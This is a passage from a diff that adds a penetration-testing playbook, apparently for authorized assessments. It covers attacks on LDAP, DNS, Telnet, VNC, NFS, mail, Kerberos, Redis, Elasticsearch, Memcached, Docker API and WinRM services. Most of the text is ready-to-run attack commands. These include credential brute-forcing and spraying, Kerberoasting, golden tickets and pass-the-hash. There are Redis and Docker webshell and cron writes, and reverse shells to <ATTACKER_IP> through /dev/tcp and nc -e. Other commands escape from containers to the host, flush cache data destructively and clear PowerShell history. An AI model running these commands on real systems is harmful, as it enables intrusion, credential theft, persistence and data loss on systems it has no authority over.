+ldapdomaindump <TARGET_IP> -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>'
+
+# BloodHound collection
+bloodhound-python -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -gc <DC_IP> -ns <DNS_IP>
+
+# Check for null session
+rpcclient -U "" -N <TARGET_IP>
+
+# LDAPS (636/tcp)
+openssl s_client -connect <TARGET_IP>:636
+ldapsearch -x -H ldaps://<TARGET_IP>:636 -b "dc=<DOMAIN>,dc=<COM>"
+
+# Global Catalog (3268/tcp)
+ldapsearch -x -h <TARGET_IP> -p 3268 -s sub "(objectclass=*)"
+```
+
+**Pitfalls:**
+- Anonymous bind disabled
+- Query size limits
+- Complex OU structures
+- Encrypted LDAP only
+- Account lockout via LDAP auth
+
+**Cleanup Steps:**
+```bash
+# No cleanup typically needed
+# Clear any local cache files
+rm -rf ~/.ldaprc
+```
+
+**Suggested Findings:**
+- Anonymous LDAP bind allowed
+- User enumeration possible
+- Sensitive attributes exposed
+- LDAP not encrypted (389 vs 636)
+- Service accounts with weak passwords
+
+**Conditions When to Try:**
+- Active Directory environment
+- Port 389/636/3268 open
+- User enumeration needed
+- Domain reconnaissance phase
+
+---
+
+## 10. DNS Service Exploitation (53/tcp, 53/udp)
+
+**Category:** Network Services  
+**Description:** Enumerate and exploit DNS services for zone transfers and cache poisoning.
+
+**Tools Required:**
+- dnsrecon
+- dnsenum
+- dig
+- nslookup
+- fierce
+- nmap
+
+**Steps/Commands:**
+```bash
+# Basic enumeration
+nslookup <TARGET_DOMAIN> <TARGET_IP>
+dig @<TARGET_IP> <TARGET_DOMAIN>
+
+# Version information
+dig @<TARGET_IP> version.bind txt chaos
+nmap -sV -p 53 <TARGET_IP>
+
+# Zone transfer attempt
+dig @<TARGET_IP> <TARGET_DOMAIN> axfr
+dnsrecon -d <TARGET_DOMAIN> -n <TARGET_IP> -t axfr
+host -l <TARGET_DOMAIN> <TARGET_IP>
+
+# Subdomain enumeration
+dnsrecon -d <TARGET_DOMAIN> -n <TARGET_IP> -t std
+dnsenum <TARGET_DOMAIN> --dnsserver <TARGET_IP>
+fierce --domain <TARGET_DOMAIN> --dns-servers <TARGET_IP>
+
+# Reverse lookup
+dig @<TARGET_IP> -x <IP_TO_LOOKUP>
+dnsrecon -r <IP_RANGE> -n <TARGET_IP>
+
+# DNS cache snooping
+dig @<TARGET_IP> +norecurse <POPULAR_DOMAIN>
+
+# Check for DNS recursion
+dig @<TARGET_IP> google.com
+nmap -p 53 --script dns-recursion <TARGET_IP>
+
+# Check DNSSEC
+dig @<TARGET_IP> <TARGET_DOMAIN> +dnssec
+nmap -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=<TARGET_DOMAIN> <TARGET_IP>
+
+# Brute force subdomains
+gobuster dns -d <TARGET_DOMAIN> -r <TARGET_IP>:53 -w <WORDLIST>
+wfuzz -c -w <WORDLIST> -H "Host: FUZZ.<TARGET_DOMAIN>" <TARGET_IP>
+
+# Check for dynamic updates
+nmap -p 53 --script dns-update <TARGET_IP>
+nsupdate -d
+> server <TARGET_IP>
+> update add test.<TARGET_DOMAIN> 86400 A <TEST_IP>
+> send
+```
+
+**Pitfalls:**
+- Zone transfers usually restricted
+- Rate limiting on queries
+- Split-horizon DNS
+- DNSSEC validation
+- Query logging alerts
+
+**Cleanup Steps:**
+```bash
+# Remove test DNS records if added
+nsupdate -d
+> server <TARGET_IP>
+> update delete test.<TARGET_DOMAIN> A
+> send
+```
+
+**Suggested Findings:**
+- DNS zone transfer allowed
+- DNS recursion enabled
+- Cache poisoning possible
+- Internal hostnames exposed
+- Dynamic updates allowed
+
+**Conditions When to Try:**
+- DNS server identified
+- Domain enumeration needed
+- Internal network mapping
+- Subdomain discovery required
+
+---
+
+## 11. Telnet Service Exploitation (23/tcp)
+
+**Category:** Remote Access Services  
+**Description:** Exploit legacy Telnet services through weak credentials and information disclosure.
+
+**Tools Required:**
+- telnet
+- hydra
+- medusa
+- nmap
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Banner grabbing
+telnet <TARGET_IP> 23
+nc -nv <TARGET_IP> 23
+nmap -sV -p 23 <TARGET_IP>
+
+# Brute force credentials
+hydra -L <USER_LIST> -P <PASSWORD_LIST> telnet://<TARGET_IP>
+medusa -h <TARGET_IP> -U <USER_LIST> -P <PASSWORD_LIST> -M telnet
+
+# Check for vulnerabilities
+nmap -p 23 --script telnet-ntlm-info <TARGET_IP>
+nmap -p 23 --script telnet-encryption <TARGET_IP>
+
+# Common default credentials
+# Routers/Switches
+admin:admin
+admin:password
+cisco:cisco
+root:root
+
+# Test for command injection
+telnet <TARGET_IP>
+# At login prompt try:
+admin;id
+admin`id`
+admin$(id)
+
+# Metasploit modules
+msfconsole -x "use auxiliary/scanner/telnet/telnet_login; set RHOSTS <TARGET_IP>; set USER_FILE <USER_LIST>; set PASS_FILE <PASSWORD_LIST>; run"
+
+# Check for telnet over TLS
+openssl s_client -connect <TARGET_IP>:992
+```
+
+**Pitfalls:**
+- Clear text transmission
+- Session hijacking risk
+- Limited to older devices
+- Account lockout
+- Character encoding issues
+
+**Cleanup Steps:**
+```bash
+# Exit telnet session properly
+exit
+# or Ctrl+] then quit
+```
+
+**Suggested Findings:**
+- Telnet service enabled
+- Weak telnet credentials
+- Clear text protocols in use
+- Default credentials unchanged
+- No encryption available
+
+**Conditions When to Try:**
+- Legacy devices present
+- Port 23 open
+- Network equipment access needed
+- IoT device assessment
+
+---
+
+## 12. VNC Service Exploitation (5900/tcp, 5800/tcp)
+
+**Category:** Remote Desktop Services  
+**Description:** Exploit VNC services for unauthorized remote desktop access.
+
+**Tools Required:**
+- vncviewer
+- hydra
+- nmap
+- metasploit
+- vncrack
+
+**Steps/Commands:**
+```bash
+# VNC enumeration
+nmap -sV -p 5900-5910 <TARGET_IP>
+nmap -p 5900 --script vnc-info <TARGET_IP>
+
+# Check authentication
+nmap -p 5900 --script vnc-brute <TARGET_IP>
+vncviewer <TARGET_IP>::5900
+
+# Brute force VNC password
+hydra -P <PASSWORD_LIST> vnc://<TARGET_IP>
+vncrack -p <PASSWORD_LIST> <TARGET_IP>:5900
+
+# Metasploit VNC login
+msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <TARGET_IP>; set PASS_FILE <PASSWORD_LIST>; run"
+
+# Check for no authentication
+vncviewer -autopass <TARGET_IP>:5900
+
+# RealVNC authentication bypass (CVE-2006-2369)
+nmap -p 5900 --script realvnc-auth-bypass <TARGET_IP>
+
+# Web-based VNC (5800/tcp)
+curl http://<TARGET_IP>:5800
+
+# Connect with password
+vncviewer <TARGET_IP>::5900 -passwd <PASSWORD_FILE>
+
+# UltraVNC specific
+vncviewer <TARGET_IP>::5900 -user <USERNAME> -passwd <PASSWORD>
+
+# Check for VNC repeater
+vncviewer -via <REPEATER_IP> <TARGET_ID>
+```
+
+**Pitfalls:**
+- Screen resolution issues
+- Bandwidth intensive
+- User sees remote access
+- Encryption not always used
+- Session disruption visible
+
+**Cleanup Steps:**
+```bash
+# Disconnect VNC session
+# Close vncviewer
+# No server-side cleanup needed
+```
+
+**Suggested Findings:**
+- Weak VNC passwords
+- No VNC authentication
+- VNC exposed externally
+- Unencrypted VNC sessions
+- Default VNC configuration
+
+**Conditions When to Try:**
+- VNC ports identified
+- Remote desktop needed
+- GUI access required
+- Weak authentication suspected
+
+---
+
+## 13. NFS Service Exploitation (2049/tcp, 111/tcp)
+
+**Category:** File Sharing Services  
+**Description:** Enumerate and exploit Network File System shares for unauthorized access.
+
+**Tools Required:**
+- showmount
+- nmap
+- rpcinfo
+- mount command
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Portmapper enumeration (111/tcp)
+rpcinfo -p <TARGET_IP>
+nmap -p 111 --script rpcinfo <TARGET_IP>
+
+# List NFS exports
+showmount -e <TARGET_IP>
+nmap -p 2049 --script nfs-ls,nfs-showmount <TARGET_IP>
+
+# Mount NFS share
+mkdir /tmp/nfs_mount
+mount -t nfs <TARGET_IP>:/<SHARE_NAME> /tmp/nfs_mount -o nolock
+mount -t nfs -o vers=<VERSION> <TARGET_IP>:/<SHARE_NAME> /tmp/nfs_mount
+
+# Enumerate NFS permissions
+nmap -p 2049 --script nfs-statfs <TARGET_IP>
+
+# Check for root squashing
+# Create file as root, check ownership
+touch /tmp/nfs_mount/test_file
+ls -la /tmp/nfs_mount/test_file
+
+# UID/GID manipulation
+# If no root squash, create suid binary
+cp /bin/bash /tmp/nfs_mount/shell
+chmod +s /tmp/nfs_mount/shell
+
+# Check NFSv4
+nmap -p 2049 --script nfs-ls --script-args 'nfs.version=4' <TARGET_IP>
+
+# Metasploit enumeration
+msfconsole -x "use auxiliary/scanner/nfs/nfsmount; set RHOSTS <TARGET_IP>; run"
+
+# Check for write access
+echo "test" > /tmp/nfs_mount/test.txt
+```
+
+**Pitfalls:**
+- Root squashing prevents privilege escalation
+- Network ACLs limit access
+- NFSv4 has better security
+- UID mapping issues
+- Stale file handles
+
+**Cleanup Steps:**
+```bash
+# Unmount NFS share
+umount /tmp/nfs_mount
+# Remove mount directory
+rmdir /tmp/nfs_mount
+# Remove test files
+rm /tmp/nfs_mount/test*
+```
+
+**Suggested Findings:**
+- World-readable NFS exports
+- No root squashing enabled
+- NFS accessible externally
+- Sensitive data in NFS shares
+- Write access to NFS shares
+
+**Conditions When to Try:**
+- Port 2049/111 open
+- File share access needed
+- Linux/Unix environment
+- Privilege escalation path
+
+---
+
+## 14. SMTP Service Exploitation (25/tcp, 587/tcp, 465/tcp)
+
+**Category:** Mail Services  
+**Description:** Enumerate SMTP services for user enumeration and relay testing.
+
+**Tools Required:**
+- telnet/nc
+- smtp-user-enum
+- nmap
+- swaks
+- sendemail
+
+**Steps/Commands:**
+```bash
+# Banner grabbing
+nc -nv <TARGET_IP> 25
+telnet <TARGET_IP> 25
+
+# SMTP commands enumeration
+nmap -p 25 --script smtp-commands <TARGET_IP>
+
+# User enumeration
+smtp-user-enum -M VRFY -U <USER_LIST> -t <TARGET_IP>
+smtp-user-enum -M EXPN -U <USER_LIST> -t <TARGET_IP>
+smtp-user-enum -M RCPT -U <USER_LIST> -t <TARGET_IP>
+
+# Manual user enumeration
+telnet <TARGET_IP> 25
+EHLO test.com
+VRFY root
+VRFY admin
+EXPN admin
+
+# Open relay testing
+nmap -p 25 --script smtp-open-relay <TARGET_IP>
+# Manual test
+telnet <TARGET_IP> 25
+EHLO test.com
+MAIL FROM: test@test.com
+RCPT TO: external@gmail.com
+DATA
+Subject: Test
+Test message
+.
+QUIT
+
+# Send test email
+swaks --to <TARGET_EMAIL> --from test@test.com --server <TARGET_IP> --body "Test"
+sendemail -f test@test.com -t <TARGET_EMAIL> -s <TARGET_IP>:25 -u "Subject" -m "Message"
+
+# Check for STARTTLS
+nmap -p 25,587 --script smtp-enum-users,smtp-commands <TARGET_IP>
+openssl s_client -starttls smtp -connect <TARGET_IP>:25
+
+# NTLM information disclosure
+nmap -p 25,587 --script smtp-ntlm-info <TARGET_IP>
+
+# Check authentication methods
+nmap -p 25,587 --script smtp-brute <TARGET_IP>
+```
+
+**Pitfalls:**
+- User enumeration disabled
+- Rate limiting
+- Greylisting delays
+- SPF/DKIM validation
+- Mail server logging
+
+**Cleanup Steps:**
+```bash
+# No cleanup typically needed
+# Check mail queue if admin access
+postqueue -p
+postsuper -d ALL
+```
+
+**Suggested Findings:**
+- SMTP user enumeration allowed
+- Open mail relay
+- Unencrypted SMTP
+- VRFY/EXPN commands enabled
+- Weak SMTP authentication
+
+**Conditions When to Try:**
+- Mail server identified
+- User enumeration needed
+- Phishing assessment
+- Information gathering phase
+
+---
+
+## 15. IMAP/POP3 Service Exploitation (143/tcp, 993/tcp, 110/tcp, 995/tcp)
+
+**Category:** Mail Services  
+**Description:** Exploit mail retrieval services for credential attacks and information disclosure.
+
+**Tools Required:**
+- telnet/nc
+- hydra
+- nmap
+- openssl
+- curl
+
+**Steps/Commands:**
+```bash
+# IMAP (143/tcp)
+nc -nv <TARGET_IP> 143
+telnet <TARGET_IP> 143
+# Commands:
+A001 CAPABILITY
+A002 LOGIN <USERNAME> <PASSWORD>
+A003 LIST "" "*"
+A004 SELECT INBOX
+A005 FETCH 1:* (BODY[])
+
+# IMAPS (993/tcp)
+openssl s_client -connect <TARGET_IP>:993
+
+# POP3 (110/tcp)
+telnet <TARGET_IP> 110
+# Commands:
+USER <USERNAME>
+PASS <PASSWORD>
+LIST
+RETR 1
+QUIT
+
+# POP3S (995/tcp)
+openssl s_client -connect <TARGET_IP>:995
+
+# Brute force credentials
+hydra -L <USER_LIST> -P <PASSWORD_LIST> imap://<TARGET_IP>
+hydra -L <USER_LIST> -P <PASSWORD_LIST> pop3://<TARGET_IP>
+
+# Nmap enumeration
+nmap -p 143,993,110,995 --script imap-capabilities,pop3-capabilities <TARGET_IP>
+nmap -p 143,993,110,995 --script imap-ntlm-info,pop3-ntlm-info <TARGET_IP>
+
+# Check for STARTTLS
+openssl s_client -starttls imap -connect <TARGET_IP>:143
+openssl s_client -starttls pop3 -connect <TARGET_IP>:110
+
+# NTLM hash disclosure
+curl -k "imap://<TARGET_IP>" --user <USERNAME>:badpass -v
+
+# Metasploit brute force
+msfconsole -x "use auxiliary/scanner/imap/imap_login; set RHOSTS <TARGET_IP>; run"
+msfconsole -x "use auxiliary/scanner/pop3/pop3_login; set RHOSTS <TARGET_IP>; run"
+```
+
+**Pitfalls:**
+- Account lockout policies
+- TLS required
+- Large mailboxes timeout
+- Multi-factor authentication
+- Connection limits
+
+**Cleanup Steps:**
+```bash
+# Logout properly
+# IMAP: A999 LOGOUT
+# POP3: QUIT
+```
+
+**Suggested Findings:**
+- Weak mail credentials
+- Unencrypted mail protocols
+- NTLM hash disclosure
+- No account lockout
+- Plain text authentication allowed
+
+**Conditions When to Try:**
+- Mail services identified
+- Credential testing needed
+- Email access required
+- Information gathering phase
+
+---
+
+## 16. Kerberos Service Exploitation (88/tcp, 464/tcp)
+
+**Category:** Authentication Services  
+**Description:** Exploit Kerberos authentication for credential attacks and ticket manipulation.
+
+**Tools Required:**
+- kerbrute
+- impacket
+- Rubeus
+- nmap
+- hashcat/john
+
+**Steps/Commands:**
+```bash
+# Enumerate Kerberos
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>' <TARGET_IP>
+
+# User enumeration via Kerberos
+kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USER_LIST>
+nmap -p 88 --script krb5-enum-users --script-args="krb5-enum-users.realm='<DOMAIN>',userdb=<USER_LIST>" <TARGET_IP>
+
+# AS-REP Roasting (no preauth required)
+impacket-GetNPUsers <DOMAIN>/ -usersfile <USER_LIST> -dc-ip <DC_IP> -format hashcat
+impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request
+
+# Kerberoasting (SPN hunting)
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -outputfile <HASH_FILE>
+
+# Crack Kerberos tickets
+hashcat -m 18200 <ASREP_HASH> <WORDLIST>  # AS-REP
+hashcat -m 13100 <TGS_HASH> <WORDLIST>    # Kerberoast
+john --format=krb5asrep <ASREP_HASH> --wordlist=<WORDLIST>
+
+# Password spraying
+kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USER_LIST> <PASSWORD>
+
+# Check for delegation
+impacket-findDelegation <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP>
+
+# Golden ticket (requires krbtgt hash)
+impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>
+
+# Pass the ticket
+export KRB5CCNAME=<TICKET.ccache>
+impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -k -no-pass
+
+# Time sync check (important for Kerberos)
+ntpdate <DC_IP>
+timedatectl set-ntp true
+```
+
+**Pitfalls:**
+- Time sync required (5min tolerance)
+- Account lockout on spraying
+- Encryption type mismatches
+- Salt changes invalidate hashes
+- Detection via honey accounts
+
+**Cleanup Steps:**
+```bash
+# Remove ticket files
+rm *.ccache *.kirbi
+# Clear Kerberos cache
+kdestroy
+```
+
+**Suggested Findings:**
+- Kerberoastable accounts
+- AS-REP roastable users
+- Weak service account passwords
+- Unconstrained delegation
+- Time sync not enforced
+
+**Conditions When to Try:**
+- Active Directory environment
+- Port 88 open
+- Domain credentials obtained
+- Privilege escalation needed
+
+---
+
+## 17. Redis Service Exploitation (6379/tcp)
+
+**Category:** NoSQL Database Services  
+**Description:** Exploit Redis in-memory database for unauthorized access and code execution.
+
+**Tools Required:**
+- redis-cli
+- nmap
+- netcat
+- metasploit
+- redis-rogue-server
+
+**Steps/Commands:**
+```bash
+# Connect without authentication
+redis-cli -h <TARGET_IP>
+
+# Test authentication requirement
+echo "INFO" | nc <TARGET_IP> 6379
+redis-cli -h <TARGET_IP> INFO
+
+# Enumerate Redis
+nmap -p 6379 --script redis-info <TARGET_IP>
+nmap -p 6379 --script redis-brute <TARGET_IP>
+
+# Common Redis commands
+redis-cli -h <TARGET_IP>
+> INFO
+> CONFIG GET *
+> KEYS *
+> GET <KEY_NAME>
+
+# Check for authentication
+redis-cli -h <TARGET_IP>
+> AUTH <PASSWORD>
+
+# Write SSH key (RCE method 1)
+ssh-keygen -t rsa -f redis_key
+(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > payload.txt
+redis-cli -h <TARGET_IP> flushall
+cat payload.txt | redis-cli -h <TARGET_IP> -x set ssh_key
+redis-cli -h <TARGET_IP>
+> CONFIG SET dir /var/lib/redis/.ssh
+> CONFIG SET dbfilename authorized_keys
+> SAVE
+
+# Webshell writing (RCE method 2)
+redis-cli -h <TARGET_IP>
+> CONFIG SET dir /var/www/html
+> CONFIG SET dbfilename shell.php
+> SET shell "<?php system($_GET['cmd']); ?>"
+> SAVE
+
+# Cron job (RCE method 3)
+redis-cli -h <TARGET_IP>
+> CONFIG SET dir /var/spool/cron
+> CONFIG SET dbfilename root
+> SET cron "\n* * * * * /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\n"
+> SAVE
+
+# Module loading (Redis 4.x+)
+redis-cli -h <TARGET_IP> MODULE LOAD <MODULE_PATH>
+
+# Master-Slave replication exploit
+python redis-rogue-server.py --rhost <TARGET_IP> --lhost <ATTACKER_IP>
+
+# Lua sandbox escape
+redis-cli -h <TARGET_IP> EVAL "dofile('/etc/passwd')" 0
+```
+
+**Pitfalls:**
+- Protected mode enabled
+- Write permissions restricted
+- SSH not installed/configured
+- Web directory unknown
+- Redis ACLs configured
+
+**Cleanup Steps:**
+```bash
+redis-cli -h <TARGET_IP>
+> FLUSHALL
+> CONFIG SET dir /tmp
+> CONFIG SET dbfilename dump.rdb
+> DEL ssh_key shell cron
+```
+
+**Suggested Findings:**
+- Redis exposed without authentication
+- Dangerous Redis commands enabled
+- File system write access
+- Weak Redis password
+- Redis running as root
+
+**Conditions When to Try:**
+- Port 6379 exposed
+- NoSQL database present
+- Looking for RCE vector
+- Cache server identified
+
+---
+
+## 18. Elasticsearch Exploitation (9200/tcp, 9300/tcp)
+
+**Category:** NoSQL Database Services  
+**Description:** Exploit Elasticsearch instances for data access and potential code execution.
+
+**Tools Required:**
+- curl
+- elasticsearch-dump
+- nmap
+- metasploit
+- jq
+
+**Steps/Commands:**
+```bash
+# Basic enumeration
+curl -X GET http://<TARGET_IP>:9200/
+curl -X GET http://<TARGET_IP>:9200/_cat/nodes?v
+curl -X GET http://<TARGET_IP>:9200/_cat/indices?v
+
+# Version and cluster info
+curl -X GET http://<TARGET_IP>:9200/_cluster/health?pretty
+curl -X GET http://<TARGET_IP>:9200/_nodes?pretty
+
+# List all indices
+curl -X GET http://<TARGET_IP>:9200/_aliases?pretty
+curl -X GET http://<TARGET_IP>:9200/_mapping?pretty
+
+# Dump data from index
+curl -X GET http://<TARGET_IP>:9200/<INDEX_NAME>/_search?pretty&size=<COUNT>
+elasticdump --input=http://<TARGET_IP>:9200/<INDEX_NAME> --output=data.json --type=data
+
+# Search for sensitive data
+curl -X POST http://<TARGET_IP>:9200/_search?pretty -H 'Content-Type: application/json' -d'
+{
+  "query": {
+    "match_all": {}
+  }
+}'
+
+# Check for script execution (CVE-2014-3120)
+curl -X POST http://<TARGET_IP>:9200/_search?pretty -H 'Content-Type: application/json' -d'
+{
+  "script_fields": {
+    "test": {
+      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\")"
+    }
+  }
+}'
+
+# Groovy script execution (older versions)
+curl -X POST http://<TARGET_IP>:9200/_scripts/groovy/<SCRIPT_NAME> -d '{
+  "script": "Runtime.getRuntime().exec(\"<COMMAND>\")"
+}'
+
+# Directory traversal (CVE-2015-3337)
+curl http://<TARGET_IP>:9200/_plugin/../../../etc/passwd
+
+# Create reverse shell (if vulnerable)
+curl -X POST http://<TARGET_IP>:9200/_search -d '{
+  "script_fields": {
+    "shell": {
+      "script": "java.lang.Runtime.getRuntime().exec(\"bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\").text"
+    }
+  }
+}'
+
+# Check authentication
+curl -u <USERNAME>:<PASSWORD> http://<TARGET_IP>:9200/
+
+# Metasploit module for traversal
+msfconsole -x "use auxiliary/scanner/http/elasticsearch_traversal; set RHOSTS <TARGET_IP>; run"
+```
+
+**Pitfalls:**
+- Script execution disabled
+- Authentication enabled
+- Read-only indices
+- Network filtering
+- Large datasets timeout
+
+**Cleanup Steps:**
+```bash
+# Delete test indices if created
+curl -X DELETE http://<TARGET_IP>:9200/<TEST_INDEX>
+# Remove scripts
+curl -X DELETE http://<TARGET_IP>:9200/_scripts/groovy/<SCRIPT_NAME>
+```
+
+**Suggested Findings:**
+- Elasticsearch exposed without auth
+- Script execution enabled
+- Sensitive data in indices
+- Directory traversal vulnerability
+- Outdated Elasticsearch version
+
+**Conditions When to Try:**
+- Port 9200/9300 open
+- Database services needed
+- Data exfiltration goals
+- Looking for RCE vectors
+
+---
+
+## 19. Memcached Service Exploitation (11211/tcp/udp)
+
+**Category:** Caching Services  
+**Description:** Exploit Memcached for information disclosure and amplification attacks.
+
+**Tools Required:**
+- telnet/nc
+- memcached-tool
+- nmap
+- metasploit
+- memcdump
+
+**Steps/Commands:**
+```bash
+# Connect to memcached
+telnet <TARGET_IP> 11211
+nc <TARGET_IP> 11211
+
+# Basic commands
+echo "stats" | nc <TARGET_IP> 11211
+echo "stats items" | nc <TARGET_IP> 11211
+echo "stats slabs" | nc <TARGET_IP> 11211
+echo "version" | nc <TARGET_IP> 11211
+
+# List all keys (if supported)
+memcdump --servers=<TARGET_IP>:11211
+
+# Get specific key
+echo "get <KEY_NAME>" | nc <TARGET_IP> 11211
+
+# Enumerate keys manually
+echo "stats cachedump <SLAB_ID> <LIMIT>" | nc <TARGET_IP> 11211
+
+# Extract all data
+# First get slabs
+echo "stats items" | nc <TARGET_IP> 11211
+# Then dump each slab
+echo "stats cachedump 1 100" | nc <TARGET_IP> 11211
+
+# Set new key
+echo -e "set testkey 0 3600 4\r\ntest\r\n" | nc <TARGET_IP> 11211
+
+# SASL authentication check
+echo "sasl_list" | nc <TARGET_IP> 11211
+
+# UDP amplification potential
+echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u <TARGET_IP> 11211
+
+# Metasploit enumeration
+msfconsole -x "use auxiliary/gather/memcached_extractor; set RHOSTS <TARGET_IP>; run"
+
+# Flush all data (destructive!)
+echo "flush_all" | nc <TARGET_IP> 11211
+
+# Check for authentication
+memcached-tool <TARGET_IP>:11211 stats
+```
+
+**Pitfalls:**
+- Binary protocol vs text protocol
+- SASL authentication enabled
+- Key names unknown
+- Large cache sizes
+- UDP amplification monitored
+
+**Cleanup Steps:**
+```bash
+# Delete test keys
+echo "delete testkey" | nc <TARGET_IP> 11211
+# Note: flush_all is destructive to all data
+```
+
+**Suggested Findings:**
+- Memcached exposed without auth
+- Sensitive data in cache
+- UDP amplification possible
+- No SASL authentication
+- Cache poisoning possible
+
+**Conditions When to Try:**
+- Port 11211 open
+- Caching layer identified
+- Information gathering phase
+- DDoS amplification testing
+
+---
+
+## 20. Docker API Exploitation (2375/tcp, 2376/tcp)
+
+**Category:** Container Services  
+**Description:** Exploit exposed Docker API for container escape and host compromise.
+
+**Tools Required:**
+- docker client
+- curl
+- nmap
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Check Docker API
+curl http://<TARGET_IP>:2375/version
+curl http://<TARGET_IP>:2375/info
+
+# List containers
+curl http://<TARGET_IP>:2375/containers/json
+curl http://<TARGET_IP>:2375/containers/json?all=true
+
+# List images
+curl http://<TARGET_IP>:2375/images/json
+
+# Connect with Docker client
+docker -H tcp://<TARGET_IP>:2375 ps
+docker -H tcp://<TARGET_IP>:2375 images
+
+# Execute commands in container
+docker -H tcp://<TARGET_IP>:2375 exec <CONTAINER_ID> /bin/bash
+docker -H tcp://<TARGET_IP>:2375 exec -it <CONTAINER_ID> /bin/sh
+
+# Create privileged container for host access
+docker -H tcp://<TARGET_IP>:2375 run -it -v /:/host --privileged alpine chroot /host bash
+docker -H tcp://<TARGET_IP>:2375 run -it --pid=host --privileged alpine nsenter -t 1 -m -u -n -i sh
+
+# Mount host filesystem
+docker -H tcp://<TARGET_IP>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# Create reverse shell container
+docker -H tcp://<TARGET_IP>:2375 run -d alpine /bin/sh -c "apk add --update nmap-ncat && nc -e /bin/sh <ATTACKER_IP> <PORT>"
+
+# Extract secrets
+docker -H tcp://<TARGET_IP>:2375 exec <CONTAINER_ID> cat /run/secrets/<SECRET_NAME>
+curl http://<TARGET_IP>:2375/containers/<CONTAINER_ID>/export -o container.tar
+
+# TLS-enabled API (2376)
+docker --tlsverify=false -H tcp://<TARGET_IP>:2376 ps
+curl -k https://<TARGET_IP>:2376/version
+
+# Deploy web shell
+docker -H tcp://<TARGET_IP>:2375 run -d -p 8080:80 -v /:/host php:apache bash -c "echo '<?php system(\$_GET[cmd]); ?>' > /var/www/html/shell.php && apache2-foreground"
+```
+
+**Pitfalls:**
+- TLS authentication required
+- Firewall restrictions
+- Container security policies
+- AppArmor/SELinux restrictions
+- Audit logging enabled
+
+**Cleanup Steps:**
+```bash
+# Remove created containers
+docker -H tcp://<TARGET_IP>:2375 rm -f <CONTAINER_ID>
+# Remove pulled images
+docker -H tcp://<TARGET_IP>:2375 rmi <IMAGE_ID>
+```
+
+**Suggested Findings:**
+- Docker API exposed without auth
+- Privileged containers possible
+- Host filesystem accessible
+- No TLS encryption
+- Container escape possible
+
+**Conditions When to Try:**
+- Port 2375/2376 open
+- Container environment
+- Host access needed
+- Privilege escalation path
+
+---
+
+## 21. WinRM Service Exploitation (5985/tcp, 5986/tcp)
+
+**Category:** Windows Remote Management  
+**Description:** Exploit Windows Remote Management for authenticated command execution.
+
+**Tools Required:**
+- evil-winrm
+- crackmapexec
+- impacket
+- metasploit
+- powershell
+
+**Steps/Commands:**
+```bash
+# Check WinRM service
+nmap -p 5985,5986 --script winrm-info <TARGET_IP>
+
+# Brute force credentials
+crackmapexec winrm <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST>
+msfconsole -x "use auxiliary/scanner/winrm/winrm_login; set RHOSTS <TARGET_IP>; run"
+
+# Connect with credentials
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>
+
+# PowerShell remoting
+$cred = Get-Credential
+Enter-PSSession -ComputerName <TARGET_IP> -Credential $cred
+# Or with explicit credentials
+$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $pass)
+Enter-PSSession -ComputerName <TARGET_IP> -Credential $cred
+
+# Execute commands
+crackmapexec winrm <TARGET_IP> -u <USERNAME> -p <PASSWORD> -x "whoami"
+# Upload and execute
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -s <LOCAL_SCRIPTS_PATH> -e <LOCAL_EXES_PATH>
+
+# SSL/HTTPS WinRM (5986)
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -S
+Enter-PSSession -ComputerName <TARGET_IP> -UseSSL -Credential $cred
+
+# Pass the hash
+evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>
+
+# Kerberos authentication
+evil-winrm -i <TARGET_IP> -r <DOMAIN>
+
+# Check for vulnerable settings
+# If you have a session
+*Evil-WinRM* PS > Get-PSSessionConfiguration
+*Evil-WinRM* PS > winrm get winrm/config/service
+
+# File transfer
+*Evil-WinRM* PS > upload <LOCAL_FILE> <REMOTE_PATH>
+*Evil-WinRM* PS > download <REMOTE_FILE> <LOCAL_PATH>
+```
+
+**Pitfalls:**
+- Requires valid credentials
+- Network Level Authentication
+- Firewall restrictions
+- PowerShell logging enabled
+- Constrained language mode
+
+**Cleanup Steps:**
+```bash
+# Exit session properly
+*Evil-WinRM* PS > exit
+Exit-PSSession
+# Clear PowerShell history
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+```
+
+**Suggested Findings:**
+- WinRM enabled on systems
+- Weak local admin passwords
+- No NLA enforcement
+- HTTP instead of HTTPS
+- Excessive WinRM permissions
+
+**Conditions When to Try:**
+- Windows environment
+- Valid credentials obtained
+- Remote execution needed
+- Port 5985/5986 open
+
+---
+
+## 22. Java RMI Service Exploitation (1099/tcp)
+
+**Category:** Application Services  
+**Description:** Exploit Java Remote Method Invocation for code execution and information disclosure.
